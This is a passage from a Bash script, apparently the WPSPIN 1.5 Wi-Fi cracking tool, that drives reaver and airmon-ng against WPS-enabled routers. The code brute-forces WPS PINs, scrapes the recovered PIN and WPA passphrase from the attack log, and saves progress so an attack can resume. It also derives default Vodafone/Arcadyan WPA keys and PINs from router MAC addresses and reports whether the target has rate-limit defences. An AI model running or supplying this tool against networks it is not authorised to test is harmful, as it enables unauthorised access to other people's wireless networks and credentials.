awk '!array_temp[$0]++'  /tmp/brouillon2.wpc >> /tmp/brouillon.wpc  # removing all duplicated values

rm -r  /tmp/brouillon2.wpc                                         # delete brouillon2.wpc

tac /tmp/brouillon.wpc >> /tmp/brouillon2.wpc

rm -r  /tmp/brouillon.wpc

echo "$HEADER" >> /tmp/brouillon2.wpc


chmod 777 "$DIRECTORY/$WPCNAME" 2> /dev/null

rm "$DIRECTORY/$WPCNAME" 2> /dev/null

tac /tmp/brouillon2.wpc >> "$DIRECTORY/$WPCNAME"

chmod 777 "$DIRECTORY/$WPCNAME" 2> /dev/null

rm -r  /tmp/brouillon2.wpc                                         # delete brouillon2.wpc


echo "$HEAD1
$HEAD2
$HEAD3" > "$DIRECTORY/vigilate.txt"

unset INICIOSEQUENCEFIRST ############################# TEST, to delete the old values entered just after making the file 
unset FINSEQUENCEFIRST
unset INICIOSEQUENCESECOND 
unset FINSEQUENCESECOND
unset SELECTEDPIN
unset FIRSTHALFSESSION
unset SECONDHALFSESSION
unset PART1
unset PART2
}


CLEAN(){
unset BIG_MENUE_CHOICE
unset BSSID
unset ESSID
unset UNKNOWN
unset ATTACK_MENUE_CHOICE
unset PIN
unset MODEL
unset APRATE
unset SPECIAL 
airmon-ng stop $MON_ATTACK &> /dev/null
rm /tmp/Interface.txt &> /dev/null
rm /tmp/airmon.txt &> /dev/null
rm /tmp/second_scan.txt &> /dev/null
rm wash_scan.txt &> /dev/null
rm attack.txt &> /dev/null
rm vigilate.txt &> /dev/null
}





PRIMARY_CHECK(){                                                     # We need to be toot to use reaver and in order to not erase
                                                                    # previous wpc session, WPSPIN need to be executed in its directory
                                                                   # so we put to until to loop that will be use at start
DIRECTORYCHECK=$( pwd | rev | cut -d "/" -f1 | rev )                        # check if we are in the good directory, WPSPIN


until  [ "$DIRECTORYCHECK" == "WPSPIN" ];                                            
  
  do                                 
  echo "$DIRECTORY_ADVERTENCIA"                                                     # 
  SHORTMENUE                                       ###################################### change according to selected language
  
done



ROOTCONTROL=$(whoami)                                                        # This variable will be used if the user is logged as root

until  [ "$ROOTCONTROL" == "root" ];                                            
  
  do                                 
  echo "$ROOT_ADVERTENCIA"                                                     # 
  SHORTMENUE                                       ###################################### change according to selected language
  
done

DIRECTORY=$(pwd)

}




REGENERATE(){                     # This function will create a new header for the *.wpc file in order to save reaver progress
                                # We will use $WPCNAME declared previously in WPCGENERATOR ( name of the wpc fie for the target)
                                                                  # the log of the attack named "attack.txt"




HEAD1=$( cat "$DIRECTORY/$WPCNAME" 2> /dev/null | awk NR==1)                # the first value of the wpc header                    
HEAD2=$( cat "$DIRECTORY/$WPCNAME" 2> /dev/null | awk NR==2)                # the second value of the wpc header
HEAD3=$( cat "$DIRECTORY/$WPCNAME" 2> /dev/null | awk NR==3)                # the third value of the wpc header 



#rm $DIRECTORY/cleanattack.txt &> /dev/null                                      # in case a previous log is still there
#awk '!array_temp[$0]++' $DIRECTORY/attack.txt >> $DIRECTORY/cleanattack.txt             # we grab the lock attack and take away the       duplicated values, not necessary but i am not sure and easier to see what happen


  declare -a PASSEDPIN                           # this array is for the full PIN that have been tried                       
  declare -a PASSEDFIRSTHALF                     # this one for the first half of PIN tried
  declare -a PASSEDSECONDHALF                    # this one for the second half

    for i in 'PASSEDPIN' 'PASSEDFIRSTHALF' 'PASSEDSECONDHALF' ;                                
      do 
       count=1          
         if [ "$i" == "PASSEDPIN" ]; then                                                         
           while read -r line; do                                                             
             PASSEDPIN[${count}]="$line"                                                             
             count=$((count+1)) 
           done < <( cat "$DIRECTORY/attack.txt" | grep -a "Trying pin" | awk -F' ' '{ print $4 }' | uniq )
         elif  [ "$i" == "PASSEDFIRSTHALF" ]; then 
           while read -r line; do                                                           
             PASSEDFIRSTHALF[${count}]="$line"                                                            
             count=$((count+1)) 
           done < <( cat "$DIRECTORY/attack.txt" | grep -a "Trying pin" | awk -F' ' '{ print $4 }' | cut -b -4 | uniq )
         elif  [ "$i" == "PASSEDSECONDHALF" ]; then 
            while read -r line; do                                                             
             PASSEDSECONDHALF[${count}]="$line"                                                            
             count=$((count+1)) 
            done < <( cat "$DIRECTORY/attack.txt" | grep -a "Trying pin" | awk -F' ' '{ print $4 }' | cut -b 5-7 | uniq )
         fi    
    done




CONCRETISED=${#PASSEDPIN[*]}                             #  index of first array ( full pin tried ) as a variable
PREMIEREMOITIE=$(echo ${#PASSEDFIRSTHALF[*]})            # idem for second array (first half ) 
DEUXIEMEMOITIE=${#PASSEDSECONDHALF[*]}                   # idem for the third (second half )


CHECKHEAD1=$( cat "$DIRECTORY/vigilate.txt" 2> /dev/null | awk NR==1)  # this is to check if reaver wrote the progress or not
CHECKHEAD2=$( cat "$DIRECTORY/vigilate.txt" 2> /dev/null | awk NR==2)
CHECKHEAD3=$( cat "$DIRECTORY/vigilate.txt" 2> /dev/null | awk NR==3)

if [ "$CHECKHEAD1" -eq "$HEAD1" ] && [ "$CHECKHEAD2" -eq "$HEAD2" ] && [ "$CHECKHEAD3" -eq "$HEAD3" ] && (( "$CONCRETISED" >> 1 ))  && [[ "$DEUXIEMEMOITIE" == "1" ]] ; then  # if first half PIN has NOT been passed successfully


           
           
           NEWHEAD1=`expr $HEAD1 '+' $PREMIEREMOITIE '-' 1`
           NEWHEAD2=$( echo "$HEAD2")
           NEWHEAD3=$( echo "$HEAD3")
           


echo "$NEWHEAD1
$NEWHEAD2
$NEWHEAD3" > "$DIRECTORY/newheader.wpc"                   # this is our new header


tail -n +4 "$DIRECTORY/$WPCNAME" >> "$DIRECTORY/newheader.wpc"     # we take away the three first line of the wpc session ( the header )

rm "$DIRECTORY/$WPCNAME"                                      # we delete our former wpc session

cat "$DIRECTORY/newheader.wpc" >> "$DIRECTORY/$WPCNAME"         # and replace it for the session with new header, progress is saved :)

rm  "$DIRECTORY/newheader.wpc"  &> /dev/null                  # we delete the new header 

chmod 777 "$DIRECTORY/$WPCNAME"




          
          elif [ "$CHECKHEAD1" -eq "$HEAD1" ] && [ "$CHECKHEAD2" -eq "$HEAD2" ] && [ "$CHECKHEAD3" -eq "$HEAD3" ] && (( "$CONCRETISED" >> 1 )) && (( "$DEUXIEMEMOITIE" >> 1 )) ; then  # if the second half has been made successfully

           
           
           NEWHEAD1=`expr $HEAD1 '+' $PREMIEREMOITIE '-' 1` 
           NEWHEAD2=`expr $HEAD2 '+' $DEUXIEMEMOITIE '-' 1`
           NEWHEAD3=1
           

echo "$NEWHEAD1
$NEWHEAD2
$NEWHEAD3" > "$DIRECTORY/newheader.wpc"                   # this is our new header


tail -n +4 "$DIRECTORY/$WPCNAME" >> "$DIRECTORY/newheader.wpc"     # we take away the three first line of the wpc session ( the header )

rm "$DIRECTORY/$WPCNAME"                                      # we delete our former wpc session

cat "$DIRECTORY/newheader.wpc" >> "$DIRECTORY/$WPCNAME"         # and replace it for the session with new header, progress is saved :)

rm  "$DIRECTORY/newheader.wpc"  &> /dev/null                  # we delete the new header 

chmod 777 "$DIRECTORY/$WPCNAME"


fi   


unset NEWHEAD1                                              # we unset the new heads
unset NEWHEAD2
unset NEWHEAD3
unset HEAD1
unset HEAD2
unset HEAD3
unset PASSEDPIN
unset PASSEDFIRSTHALF
unset PASSEDSECONDHALF
unset CONCRETISED
unset PREMIEREMOITIE
unset DEUXIEMEMOITIE
unset CHECKHEAD1
unset CHECKHEAD2
unset CHECKHEAD3
unset SELECTEDPIN

#rm -r $DIRECTORY/cleanattack.txt                         # We delete cleanattack.txt we don't need it

}




ATTACK_ATTACK()                                                         # for not writing several time the same code, the same attack
{                                                                       # attack function will be used for all menu option
     echo ""
     echo "$STOP_REAVER"                                                  # little message saying that the attack can be stop by pressing ctrl and c
 #    ifconfig $MONOTORIZED_WLAN up 2> /dev/null ########################### TO BE REMOVED
                                                             
  if [ -n "${RT_CHECK}" ]; then                    ###### If chipset is rt series it needs to have the wlan up for the attack.
      airmon-ng stop $MON_ATTACK  &> /dev/null
      ifconfig $MONOTORIZED_WLAN down &> /dev/null   ###### other chipset works better with the wlan down. 
      MON_ATTACK=$( airmon-ng start $MONOTORIZED_WLAN | grep enabled |  awk -F' ' '{ print $5 }' |  sed -e 's/)//g' ) &>/dev/null 
      ifconfig $MONOTORIZED_WLAN up &> /dev/null 
  fi 


        if [ "$BIG_MENUE_CHOICE" == 1 ]; then                             # If we have the scan mode we can give the canal in our reaver attack

           if [ -z "${REAVERCOMMAND}" ]; then
           reaver -b $BSSID -i $MON_ATTACK -s "$DIRECTORY/$WPCNAME" -vv -c $CHANNEL -n   | tee attack.txt    # we put some delay everywhere for not stressing too much AP - for now not that the code   "-d 2 -t 2 -T 2"
           chmod 777 "$DIRECTORY/attack.txt"
           else
           reaver -b $BSSID -i $MON_ATTACK -s "$DIRECTORY/$WPCNAME" $REAVERCOMMAND | tee attack.txt
           chmod 777 "$DIRECTORY/attack.txt"
           unset REAVERCOMMAND
           fi 
       else                                                      # if not we don't put canal
           if [ -z "${REAVERCOMMAND}" ]; then        
            reaver -b $BSSID -i $MON_ATTACK -s "$DIRECTORY/$WPCNAME" -n -vv | tee attack.txt 
            chmod 777 "$DIRECTORY/attack.txt"
            else
            reaver -b $BSSID -i $MON_ATTACK -s "$DIRECTORY/$WPCNAME" $REAVERCOMMAND | tee attack.txt
           chmod 777 "$DIRECTORY/attack.txt"
           unset REAVERCOMMAND
           fi
       fi 

                                                

     VICTORY_PIN=$(cat  attack.txt | grep "WPS PIN" | cut -d ":" -f2- | cut -c3- | rev | cut -c2- | rev)  # in case the key is found we grep the PIN
     KEY=$(cat  attack.txt | grep "WPA PSK" | cut -d ":" -f2- | cut -c3- | rev | cut -c2- | rev)          # and the WPAPASSPHRASE that will be our variable KEY    
                                                                                # we erase the log
       if [ "$KEY"  == "" ]; then                                                                              # if no passphrase is recovered than 
           
           echo ""
           echo "$FAILED"                                                                                      # failed display a message
           echo ""
           
           REGENERATE # We call the function to eventually keep the reaver progress in *.wpc file 

       else 
         
        
          echo -e " $blanco  WPA$colorbase>>> $rojo $KEY $colorbase "                                           # otherwise appears a success message
          echo "$KEY_FOUND"
          echo "                                                                                                 
        
     KEY FOUND!!! XD

     
        WPA >>>>>>   $KEY

  ESSID    >   $ESSID
  BSSID    >   $BSSID
  PIN      >   $VICTORY_PIN
  WPA      >   $KEY
        

        WPA >>>>>>   $KEY           



WPSPIN for linux   www.crack.wifi.com  wwww.lampiweb.com  www.auditoriaswireless.net

" > $ESSID.txt                                                                                                # data are saved in a little text
        echo -e "                        $azulfluo        $ESSID.txt  $colorbase"
        echo ""
        echo -e "ESSID    >  $blanco  $ESSID  $colorbase "
        echo -e "BSSID    >  $blanco  $BSSID  $colorbase "
        echo -e "PIN      >  $rojo  $VICTORY_PIN $colorbase "
        echo -e "WPA      >  $amarillo  $KEY $colorbase "   
       
        
        
        REGENERATE            # We call the function to keep the reaver progress in *.wpc file and in this case the key has been found
        
        sed -i '3s/.*/2/' "$DIRECTORY/$WPCNAME"   

       fi



if [[ -n `(cat attack.txt | grep -E 'Failed to initialize' )` ]];  # in case we get this error : "Failed to initialize interface"

  then

    FAILEDREAVER                                                   # TO BE WRITTEN ACCORDING TO THE LANGUAGE
 
fi                                                       # What is coming next is to seek for invalid M that have been validated by reaver
                                                # bug that recognize has tried and not valid M that haven't been fully checked and could          # the "99,99% bug"


FAKEM6=$( cat attack.txt | grep -A3 -E 'Sending M6 message' | grep -A2 -E 'WARNING: Receive timeout occurred' | grep -A1 -E 'Sending WSC NACK' | grep -E 'Trying pin' | awk -F' ' '{ print $4 }' | cut -b 5-7 | awk NR==1 )

FAKEM4=$( cat attack.txt | grep -A3 -E 'Sending M4 message' | grep -A2 -E 'WARNING: Receive timeout occurred' | grep -A1 -E 'Sending WSC NACK' | grep -E 'Trying pin' | awk -F' ' '{ print $4 }' | cut -b -4 | awk NR==1 )

  if [[ -n "$FAKEM4" ]] ;
    then
      INDICEBADM4=$( cat "$DIRECTORY/$WPCNAME" | grep -n -E "$FAKEM4" | awk -F':' '{ print $1 }' | tr -d ':' ) 
      NEWLINE=`expr $INDICEBADM4 '-' 5`
      echo "$NEWHEAD1
$NEWHEAD2
$NEWLINE" > "$DIRECTORY/BACKUPfakeM4_$WPCNAME"
     cat "$DIRECTORY/$WPCNAME" | tail -n +4 >> "$DIRECTORY/BACKUPfakeM4_$WPCNAME"

    FAKEM4WARNING  # REDACTED ACORDING LANGUAGE 
  
unset NEWLINE && unset INDICEBADM4 && unset FAKEM4
  fi

  if [[ -n "$FAKEM6" ]] ; 
    then
    INDICEBADM6=$( cat "$DIRECTORY/$WPCNAME" | grep -n -E "$FAKEM6" | awk -F':' '{ print $1 }' | tr -d ':' | tac | awk NR==1 )
    NEWLINE=`expr $INDICEBADM6 '-' 10005`
    echo "$NEWHEAD1
$NEWLINE
$NEWHEAD3" > "$DIRECTORY/BACKUPfakeM6_$WPCNAME"
    cat "$DIRECTORY/$WPCNAME" | tail -n +4 >> "$DIRECTORY/BACKUPfakeM6_$WPCNAME"
  
   FAKEM6WARNING # REDACTED ACORDING LANGUAGE

unset NEWLINE && unset INDICEBADM6 && unset FAKEM6
 
  fi


 
rm attack.txt &> /dev/null                            # We delete the log of the attack 
}



ARCADYAN(){
# This function uses three amazing works
#   1) easybox_keygen.sh (c) 2012 GPLv3 by Stefan Wotan and Sebastian Petters from www.wotan.cc 
#   2) easybox_wps.py by Stefan Viehböck http://seclists.org/fulldisclosure/2013/Aug/51
#   3) Vodafone-XXXX Arcadyan Essid,PIN WPS and WPA Key Generator by Coeman76 from lampiweb team (www.lampiweb.com)
# 
# Thanks to the three of them for their dedication and passion and for deleivering full disclosure and free code
# This function is based on the script easybox_keygen.sh previously mentioned
# # The quotation from the original work start with double dash and are beetwen quotes
# Some variables and line are changed for a better integration and I add the PIN calculation and Coeamn trick for default WPA  
# the lines quoted with six dash and "unchanged"  are exactly the same than in easybox_keygen  like this "######unchanged" 


# This function requires $BSSID which is the mac adress ( hex may format XX:XX:XX:XX:XX:XX)
# It will return $DEFAULTSSID, with essid by default, the wpa passphrase ($DEFAULTWPA) and $STRING, the 7 first digit of our PIN, ready to use in CHECKSUM to
# give the full WPS PIN ($PIN)

## "Take the last 2 Bytes of the MAC-Address (0B:EC), and convert it to decimal." < original quote from easybox_keygen.sh
deci=($(printf "%04d" "0x`(echo $BSSID | cut -d ':' -f5,6 | tr -d ':')`" | sed 's/.*\(....\)/\1/;s/./& /g')) # supression of $take5 and $last4 compared with esaybox code, the job is directly done in the array value assignation, also the variable $MAC has been replaced by $BSSID taht is used in WPSPIN
## "The digits M9 to M12 are just the last digits (9.-12.) of the MAC:" < original quote from easybox_keygen.sh
hexi=($(echo ${BSSID:12:5} | sed 's/://;s/./& /g')) ######unchanged
## K1 = last byte of (d0 + d1 + h2 + h3) < original quote from easybox_keygen.sh
## K2 = last byte of (h0 + h1 + d2 + d3) < original quote from easybox_keygen.sh
c1=$(printf "%d + %d + %d + %d" ${deci[0]} ${deci[1]} 0x${hexi[2]} 0x${hexi[3]})  ######unchanged
c2=$(printf "%d + %d + %d + %d" 0x${hexi[0]} 0x${hexi[1]} ${deci[2]} ${deci[3]})  ######unchanged
K1=$((($c1)%16))  ######unchanged
K2=$((($c2)%16))  ######unchanged
X1=$((K1^${deci[3]}))  ######unchanged
X2=$((K1^${deci[2]}))  ######unchanged
X3=$((K1^${deci[1]}))  ######unchanged
Y1=$((K2^0x${hexi[1]}))  ######unchanged
Y2=$((K2^0x${hexi[2]}))  ######unchanged
Y3=$((K2^0x${hexi[3]}))  ######unchanged
Z1=$((0x${hexi[2]}^${deci[3]}))  ######unchanged
Z2=$((0x${hexi[3]}^${deci[2]}))  ######unchanged
Z3=$((K1^K2))  ######unchanged
STRING=$(printf '%08d\n' `echo $((0x$X1$X2$Y1$Y2$Z1$Z2$X3))` | rev | cut -c -7 | rev) # this to genrate later our PIN, the 7 first digit  
DEFAULTWPA=$(printf "%x%x%x%x%x%x%x%x%x\n" $X1 $Y1 $Z1 $X2 $Y2 $Z2 $X3 $Y3 $Z3 | tr a-f A-F | tr 0 1) # the change respected to the original script in the most important thing, the default pass, is the adaptation of Coeman76's work on spanish vodafone where he found out that no 0 where used in the final pass
DEFAULTSSID=$(echo "Vodafone-`echo "$BSSID" | cut -d ':' -f5,6 | tr -d ':' | tr 0 G`")  # the modification of the algorithm in this line is also a contribution of lampiweb forum, for default ssid if there should be a zero it is replaced by G 
}









#############################################################################################################################################################################
######################################################
#####################################################                  SCRIPT START
#####################################################
####################################################  FIRST START WITH LANGUAGE SELECTION, WE WILL DEFINE THE OUTPUT ACCORDING TO THIS SELECTION#########################
######################################################

SELECTIONLANGUE=0                                  # The script start with a menu to select language, default value is 0 for the variable that set the selection

while [ $SELECTIONLANGUE -eq 0 ]; do               # while this value is equal to zero

echo -e "
       .$amarillo'(     /$rojo·-.  $amarillo  )(.$rojo--.  $amarillo   /$rojo·-.  .$amarillo'(   )\  )\  $rojo
   ,') \  )  ,' _  \  (   ._.'  ,' _  \ \  ) (  \, / $colorbase     coded by$blanco kcdtv $rojo   
  (  /(/ /  (  '-' (   ·-. .   (  '-' ( ) (   ) \ (   $colorbase featuring  $blanco antares_145$rojo
   )    (    ) ,._.'  ,_ (  \   ) ,._.' \  ) ( ( \ \    $blanco r00tnull$colorbase -$blanco 1camaron1$rojo
  (  .'\ \  (  '     (  '.)  ) (  '      ) \  ·.)/  )    $blanco Coeman76$colorbase -$blanco Spawn$rojo  
$amarillo   )/   )/   )/   $rojo    '._,_.' $amarillo  )/        )/  $rojo   '$amarillo.( $colorbase  and the$blanco lampiweb team $colorbase"
echo ""
echo ""
echo -e "    $amarillo www.crack-wifi.com     www.lampiweb.com    www.auditoriaswireless.net$colorbase
"
echo -e "                                                        "
echo -e " $magenta      _   ''   $rojo  _ () _      $amarillo                _ _ _                       
 $magenta     [|)efault$rojo  ||)[][|\|$magenta  generator  with$amarillo   \\/\/||)S $magenta attack  interface
   $rojo              L|          $amarillo                     L|  $magenta  ''                   "
echo "
"
echo -e "$colorbase                          $REALORANGE WPSPIN VERSION 1.5$colorbase for Linux, GPLv3"
echo -e "$colorbase   Support for more than 30 models and 100's bssid from main manufacturers$magenta 
$blanco TP-Link Belkin$magenta Huawei$blanco Conceptronic$magenta D-Link Samsung$blanco Zyxel$magenta ZTE$blanco Bewan$colorbase and more..."
echo -e "      including$magenta$colorbase algorithms by$magenta Zhao Chunsheng$blanco S.Wottan$magenta Coeman76$blanco S.Viehböck $colorbase"
echo -e "designed for$magenta reaverwps$colorbase ($blanco Craig Heffner$colorbase) and$magenta Kali linux$colorbase (details in README.txt)"
echo -e "

$rojo 
                             ||  $rojo    _         ____ ''
                             L_]angu//\ge  selecL|   $colorbase

"
               # while this value is equal to zero  
echo -e "                         +---------------------------+     "
echo -e "                         |   $blanco  1$colorbase  -$amarillo  ENGLISH   $colorbase      |     "
echo -e "                         |   $blanco  2$colorbase  -$amarillo  ESPANOL   $colorbase      |     "
echo -e "                         |   $blanco  3$colorbase  -$amarillo  FRANCAIS  $colorbase      |     "
echo -e "                         +---------------------------+     "
echo -e " "
echo -e "$rojo"
read -ep "                                       " SELECT
echo -e "$colorbase"
 if [[ $SELECT == "1" ]]; then                     # if this value is 1
  SELECTIONLANGUE=1                                # then the selected language will be 1, English
   elif [[ $SELECT == "2" ]]; then            
   SELECTIONLANGUE=2                               # 2 will be Spanish
     elif [[ $SELECT == "3" ]]; then
     SELECTIONLANGUE=3                             # 3 will be French
       else                                        # anything else will keep the variable with a value of 0 and bring us back to the beginning of the while loop
       SELECTIONLANGUE=0                           # where the user has to enter his choice for the language
 fi
done  


################################################ WE DEFINE THE FUNCTIONS AND VARIABLES THAT CHANGES WITH LANGUAGE #######################################################
#################################################################
###########################################   THE FUNCTIONS ARE >>>>>>>
################################################### 1 - OUTPUT  > gives model router, default PIN and other elements about target AP   ###############################
################################################### 2 - DATASGENERADOR > the user will enter bssid and essid for the generator mode ####################################3
################################################### 3 - SHORT MENUE > If the user does not have mode monitor he will be limited in his options in short menu
################################################### 4 - SELECT_THEIFACE > prompt the user which is his/her choice
################################################### 5 - WASH_DISPLAY > prompt the user which is his/her choice
################################################### 6 - BIG_MENUE_DISPLAY > Shows the options of the big menu
################################################### 7 - CIAO > you say goodbye, and i say hello, hello hello.
################################################### 8 - ATTACK_MENUE_DISPLAY > Shows the options of attack menu
################################################### 9 - CUSTOMPIN > allow the user to enter manually a PIN for attack
################################################### 10 - SECATOR > allow the user to enter a sequence of selected PIN
################################################### 11 - SUMUPNOM6 > Show the progress made in a wpc session without M6
################################################### 12 - SUMUPM6 > Show the progress when we got the M6
################################################### 13 - PINFOUND > displayed if the pin has been found
################################################### 14 - FAILEDREAVER > Warning in case of "Failed to initialize interface" with reaver
################################################### 15 - CUSTOMREAVER > the user will be prompt to enter aditional arguments for reaver attack

##########################################    THE VARIABLES ARE >>>>>>>
##################################################  1 . MON_ADVERTENCIA > If the unique chipset is unknown by airmon-ng
#################################################   2 - INTERFACEDESIGN > the top of menu to select interface
#################################################   3 - WASHWAIT > warn the user that the scan with wash is taking place
#################################################   4 - NO_MONITOR_MODE > That will define "WARNING" in the short menu (no mode monitor available, no reaver installed,no wash 
#################################################   5 - NO_REAVER > if there is no wps reaver  installed 
#################################################   6 - FAILED > When the wpa passphrase hasn't been recovered
#################################################   7 - KEY_FOUND > When reaver finds the key
#################################################   8 - STOP_REAVER > shows to the user that he can stop the attack by pressing CTRL+C
#################################################   9 - AIRMON_WARNING > chipset is not fully supported 
#################################################  10 - ROOT_ADVERTENCIA > The user is not root, short menu is forced
#################################################  11 - DIRECTORY_ADVERTENCIA > WPSPIN need it directory, to ensure the correct location
#################################################  12 - FAKE M4 WARNING > suspicious M4 is detected, user is warn
#################################################  13 - FAKE M6 WARNING > the same with M8



#############################################################################################
if [ "$SELECTIONLANGUE" == 1 ]; then  ############################### 1 > ENGLISH LANGUAGE #################################################################################





OUTPUT(){



echo -e "$colorbase"
echo "+------------------------------------------------------------------------------+"
echo -e "|          $violet                  DEVICE INFORMATION          $colorbase                      |"
echo "+------------------------------------------------------------------------------+"

if [ -n "${FABRICANTE}" ]; then
     DISPLAYFABRICANTE=$( echo "$FABRICANTE                                                              " | cut -b -61 )
   echo -e "| Manufacturer :$amarillo $DISPLAYFABRICANTE $colorbase|"
fi

if [ -n "${DEFAULTSSID}" ]; then
    DISPLAYDEFAULTSSID=$( echo "$DEFAULTSSID                                                              " | cut -b -61 )
   echo -e "| Default SSID :$amarillo $DISPLAYDEFAULTSSID $colorbase|"
fi

if [ -n "${MODEL}" ]; then
DISPLAYMODEL=$( echo "$MODEL                                                              " | cut -b -61 )
echo -e "| Model        :$amarillo $DISPLAYMODEL $colorbase|"
fi

 unset DISPLAYFABRICANTE && unset DISPLAYDEFAULTSSID && unset DISPLAYMODEL


  if [ "$UNKNOWN" -eq "0"  ]; 
    then

     echo "+------------------------------------------------------------------------------+"
     echo -e "|           $violet                      ABOUT WPS          $colorbase                          |"
     echo "+------------------------------------------------------------------------------+"

       if [ "$ACTIVATED" -eq "1" ] ; 
        then
          echo -e "|     $verdefluo              WPS ENABLED WITH DEFAULT SETTINGS     $colorbase                     |" 
          echo "+------------------------------------------------------------------------------+"
       else
          echo -e "|      $rojo              WPS DISABLED WITH DEFAULT SETTINGS     $colorbase                   |"
          echo "+------------------------------------------------------------------------------+"  
       fi

      if  [ "$APRATE" -eq "0" ] ;
        then
        echo -e "|              $verdefluo     NO AP RATE LIMIT DEFENSE MECHANISM    $colorbase                     |"  
        echo "+------------------------------------------------------------------------------+"
      else
        echo -e "|          $rojo         BE AWARE : AP RATE LIMIT IS ENABLED !      $colorbase                |"
        echo "+------------------------------------------------------------------------------+"
      fi
 
      if  [ "$SPECIAL" -eq "1" ] ;
        then
        echo -e "|    $rojo    CHECK TARGET MODEL, DIFFERENT DEVICES SHARE THIS BSSID RANK $colorbase          |"
        echo "+------------------------------------------------------------------------------+" 
      fi
  DISPLAYPIN=$( echo "$PIN $PIN1 $PIN2 $PIN3 $PIN4 $PIN5 $PIN6 $PIN7 $PIN8                                                                   " | cut -b -78 )        

echo "+------------------------------------------------------------------------------+"
echo -e "| $violet                           DEFAULT(s) PIN(s)    $colorbase                             |"     
echo -e "|$amarillo$DISPLAYPIN$colorbase|"
echo "+------------------------------------------------------------------------------+"
 elif [ "$UNKNOWN" -eq "1"  ]; then

    echo "+------------------------------------------------------------------------------+"
    echo -e "|          $orange             UNKNOWN or UNSUPPORTED DEVICE   $colorbase                       |"
    echo "|                                                                              |"
    echo "+------------------------------------------------------------------------------+" 
    echo -e "|                        $orange POSSIBLE PIN :$amarillo $PIN        $colorbase                      |" 
    echo "+------------------------------------------------------------------------------+"
 
 else
    echo "+------------------------------------------------------------------------------+" 
    echo -e "|          $rojo                   UNSUPPORTED DEVICE   $colorbase                            |"
    echo "|                                                                              |"
    echo "+------------------------------------------------------------------------------+" 
 
 fi

if [ -n "${DEFAULTWPA}" ]; then
DEFAULTWPADISPLAY=$(echo "$DEFAULTWPA                                                                           " | cut -c -78)
 echo -e "|  $violet                        DEFAULT WPA PASSPHRASE   $colorbase                           |"
 echo -e "|$verdefluo$DEFAULTWPADISPLAY$colorbase|"
 echo "+------------------------------------------------------------------------------+"
fi
}



DATASGENERADOR(){
echo -e "$colorbase"
echo -e "                    -------------------------------------"
echo ""
read -ep "                1 > Insert eSSID and press <Enter> : "  ESSID          # essid has a variable                
echo "  "
read -ep "                2 > Insert bSSID and press <Enter> : " BSSID           # bssid has variable
echo "  "
while !(echo $BSSID | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
do                                                                           # fast and smart filter for conformity bssid with loop over conditions... gracias antares XD
echo -e " $rojo Error : MAC No Conform $colorbase"
echo "  "
read -ep "                2 > Insert bSSID and press <Enter> : " BSSID 
echo "  "            
done
}


SHORTMENUE(){                                                 # Reduced menu inside which the user will be blocked  if no monitor interface is possible, no scan, no attack



echo "$SORTMENUE_WARNING"
echo ""
echo -e "$colorbase"
echo -e "                              $orange       ¿   $negro  ?           "
echo -e "                            $verde    ?   $azul    ?      $colorbase        " 
echo -e "                        $blanco       ¿ $colorbase  >X<  $gris  ¿         $colorbase "     
echo -e "                               -  (O o)  -         "
echo -e "                    +---------ooO--(_)--Ooo-------------+   "
echo -e "                    |                                   |   " 
echo -e "                    | $blanco   1$colorbase -$amarillo  GENERATE PIN$colorbase              |   "
echo -e "                    | $blanco   2$colorbase -$amarillo  RELOAD INTERFACES CHECK$colorbase   |   "
echo -e "                    | $blanco   3$colorbase -$amarillo  EXIT WPSPIN$colorbase               |   "
echo -e "                    |                                   |   "
echo -e "                    +-----------------------------------+   "
echo -e ""
echo ""
echo ""
echo -e "                              Your choice : $rojo" 
echo ""  
read -ep  "                                      " SHORTMENUE_CHOICE                
echo -e "$colorbase"                   

if [ "$SHORTMENUE_CHOICE" == "1" ] ; then

    DATASGENERADOR
    GENERATE
    OUTPUT
unset PIN2 && unset PIN3 && unset PIN4 && unset PIN5 && unset PIN6 && unset PIN7 && unset PIN8 && unset  FABRICANTE  && unset DEFAULTSSID   && unset MODEL

echo -e " "
echo -e "      ...$verdefluo  press <enter> to continue $colorbase..."    # pause to let the user copy the given data 
read -ep "" NIENTE

   SHORTMENUE  
  
elif [ "$SHORTMENUE_CHOICE" == "2" ] ; then

    IFACE

elif [ "$SHORTMENUE_CHOICE" == "3" ]; then

CLEAN
CIAO

exit 0

else

echo -e " ................$rojo  incorrect option $colorbase........"

 SHORTMENUE
    

fi

}




SELECT_THEIFACE (){
read -ep "                           Select interface : " i        # ask the user to choose among available interfaces   
}


WASH_DISPLAY(){                                    # WE make a break here to be able to just display the results later and because it was confusing for languages
if [ "$WALSH_O_WASH" == "wash" ]; then 

echo "--------------------------------------------------------------------------------"        # devolvemos el resultado reorganizandolo
echo -e "  $blanco          BSSID         RSSI  WPS  Locked    PIN    Channel    ESSID  $colorbase"          
echo "--------------------------------------------------------------------------------"
echo ""

else

echo "--------------------------------------------------------------------------------"        # devolvemos el resultado reorganizandolo
echo -e "  $blanco           BSSID                 PIN               ESSID  $colorbase"          
echo "--------------------------------------------------------------------------------"
echo ""

fi

for i in ${!BSSID[*]}; do
  
  CHANNEL_CHECK=$(echo ${CHANNEL[${i}]})
  LOCK_CHECK=$(echo ${LOCKED[${i}]})
  BSSID=$(echo ${BSSID[${i}]})
  ESSID=$(echo ${ESSID[${i}]})
  
  GENERATE

  if [ "$WALSH_O_WASH" == "wash" ]; then  
    if [ "$LOCK_CHECK" = "No" ]; then
      DISPLAY_LOCKED=$( echo -e "$verde  No$colorbae")
    else
      DISPLAY_LOCKED=$( echo -e "$rojo Yes$colorbae")  
    fi
    if [ "$CHANNEL_CHECK" -lt 10 ]; then
      DISPLY_CHANNEL=$( echo " $CHANNEL_CHECK")
    else
      DISPLY_CHANNEL=$(echo ${CHANNEL[${i}]})
    fi  
  fi

  if [ "$i" -lt 10 ]; then
    NUM=$( echo -e " $amarillo$i$colorbase")
  else
    NUM=$( echo -e "$amarillo$i$colorbase")
  fi 


  if [ "$UNKNOWN" = 1 ]; then
    DISPLAY_PIN=$( echo -e "$orange$PIN$colorbase" )
  elif [ "$UNKNOWN" = 0 ]; then
    DISPLAY_PIN=$( echo -e "$verdefluo$PIN$colorbase" ) 
  else
    DISPLAY_PIN=$( echo -e "$rojo UNKNOWN$colorbase" )
  fi
  
    
  if [ -n "${DEFAULTWPA}" ]; then
    DISPLAYBSSID=$( echo -e "$azulfluo$BSSID$colorbase")
  else
    DISPLAYBSSID=$( echo -e "$blanco$BSSID$colorbase")
  fi
  if [ "$WALSH_O_WASH" == "wash" ]; then
